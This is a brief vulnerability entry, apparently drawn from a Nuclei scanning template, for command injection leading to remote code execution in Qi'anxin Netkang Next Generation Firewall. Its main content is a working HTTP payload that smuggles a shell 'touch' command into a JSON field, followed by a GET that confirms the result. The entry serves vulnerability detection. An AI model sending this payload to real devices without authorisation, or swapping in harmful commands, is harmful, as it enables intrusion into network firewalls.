# Vulnerability: Qi'anxin Netkang Next Generation Firewall - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`qi-anxin-netkang-next-generation-firewall-rce.yaml`)

## Description
Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /directdata/direct/router HTTP/1.1
Host: {{Hostname}}

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}

GET /{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}
```

